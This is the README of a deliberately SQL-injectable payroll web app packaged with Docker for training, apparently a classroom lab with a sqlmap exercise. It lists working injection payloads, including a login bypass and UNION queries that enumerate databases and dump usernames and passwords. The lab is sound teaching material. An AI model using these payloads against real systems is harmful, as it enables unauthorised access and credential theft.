# startrek_payroll

A simple SQL injection vulnerable web application powered by Docker

## Project Summary

This is a simple web application that is vulnerable to SQL injection attacks. The web application is based on the `payroll_app` from the [Metasploitable3 project](https://github.com/rapid7/metasploitable3), and the PHP code is taken (almost) directly from that project. The primary contribution of this project is a Docker environment using docker-compose and consisting of Nginx, PHP and MySQL containers to run the web application easily.

## Lancement


docker-compose up --env-file .env -d

Open web browser and visit:

- `http://localhost:8080`


## Example Payloads

1. Normal login to get users salary:
    - `username`: `james_kirk`
    - `password`: `kobayashi_maru`

2. Dump username and salary of all users:
    - `username`: `' OR 1=1#`
    - `password`: `anythingyouwant`

3. Dump MySQL version:
    - `username`: `' UNION SELECT null,@@version#`
    - `password`: `anythingyouwant`

Dump all server databases

' UNION ALL SELECT NULL,concat(schema_name) FROM information_schema.schemata; #

Dump all tables in a database (here: capturethefenelon)

' UNION ALL SELECT NULL,concat(TABLE_NAME) FROM information_schema.TABLES WHERE table_schema='capturethefenelon' #


Dump all columns names in a table (here: users)

' UNION ALL SELECT NULL,concat(column_name) FROM information_schema.COLUMNS WHERE TABLE_NAME='users' #


Dump all datas

' UNION ALL SELECT NULL,concat(0x28,username,0x3a,first_name,0x3a,last_name,0x3a,password,0x29) FROM users #




Doivent le faire avec sqlmap
Fournir le TP sqlmap